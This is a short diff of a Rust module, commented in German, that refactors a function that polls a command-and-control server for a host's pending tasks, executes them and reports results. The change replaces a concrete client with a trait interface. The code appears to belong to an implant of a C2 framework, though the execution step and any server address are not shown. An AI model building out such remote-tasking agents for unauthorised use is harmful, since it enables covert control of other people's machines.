@@ -18,7 +18,7 @@ use kx_core::c2::{Task, TaskResultRequest, STATUS_DONE, STATUS_FAILED, STATUS_PE
 use tokio::time::timeout;
 use tracing::{error, info, warn};
 
-use crate::c2::C2Client;
+use crate::c2::C2Port;
 
 /// Laengste Ausgabe, die zurueckgemeldet wird.
 ///
@@ -29,8 +29,8 @@ const MAX_RESULT_LEN: usize = 8 * 1024;
 /// Holt die offenen Tasks dieses Hosts, fuehrt sie aus und meldet die Ergebnisse.
 ///
 /// Gibt die Anzahl der ausgefuehrten Tasks zurueck.
-pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize, TransportError> {
-    let tasks = client.fetch_tasks()?;
+pub async fn run_pending_tasks(port: &dyn C2Port, host_id: &str) -> Result<usize, TransportError> {
+    let tasks = port.hole_tasks()?;
     let pending: Vec<&Task> = tasks
         .iter()
         .filter(|t| t.host_id == host_id && t.status == STATUS_PENDING)
@@ -55,7 +55,7 @@ pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize
             status: status.to_string(),
             result: output.output,
         };
-        match client.report_task_result(&report) {
+        match port.melde_task_ergebnis(&report) {
             Ok(()) => {
                 info!("Task {task_id} ausgeführt: {status}", task_id = task.id);
                 executed += 1;
